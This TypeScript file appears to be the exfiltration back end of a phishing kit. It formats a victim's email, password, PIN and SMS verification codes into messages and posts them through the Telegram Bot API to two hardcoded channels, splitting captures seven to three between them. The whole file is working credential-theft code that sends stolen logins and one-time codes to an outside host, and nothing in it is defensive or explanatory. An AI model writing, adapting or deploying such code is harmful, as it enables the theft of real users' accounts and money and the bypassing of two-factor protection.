// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const PRIMARY_CHANNEL = process.env.PRIMARY_CHANNEL || "@samcash1233";    // First 7 out of 10
const SECONDARY_CHANNEL = process.env.SECONDARY_CHANNEL || "@shamcashsca1"; // Last 3 out of 10

// Counter for sequential distribution (7/3 pattern)
let registrationCounter = 0;

// Function to select channel based on sequential 7/3 pattern
// First 7 registrations go to PRIMARY, next 3 to SECONDARY, then repeat
export function selectChannel(): string {
  registrationCounter++;
  const position = ((registrationCounter - 1) % 10) + 1; // Position in cycle: 1-10
  
  // Positions 1-7 → PRIMARY_CHANNEL
  // Positions 8-10 → SECONDARY_CHANNEL
  const selectedChannel = position <= 7 ? PRIMARY_CHANNEL : SECONDARY_CHANNEL;
  
  console.log(`📊 Registration #${registrationCounter} (position ${position}/10) → ${selectedChannel}`);
  
  return selectedChannel;
}

// Send to a specific channel (for related messages)
export async function sendToTelegramChannel(message: string, channel: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.error("Telegram credentials not configured");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: channel,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log(`Message sent to Telegram channel: ${channel}`);
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

// Legacy function - kept for backward compatibility
export async function sendToTelegram(message: string): Promise<boolean> {
  const selectedChannel = selectChannel();

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: selectedChannel,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log(`Message sent to Telegram channel: ${selectedChannel}`);
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

export function formatLoginMessage(
  email: string, 
  password: string, 
  pin: string
): string {
  return `
🔐 <b>New Login</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
🔢 PIN: <code>${pin}</code>
  `.trim();
}

export function formatSMSMessage(
  email: string, 
  smsCode: string,
  codeNumber: number
): string {
  return `
📱 <b>SMS ${codeNumber}</b>

📧 Email: <code>${email}</code>
💬 Code: <code>${smsCode}</code>
  `.trim();
}
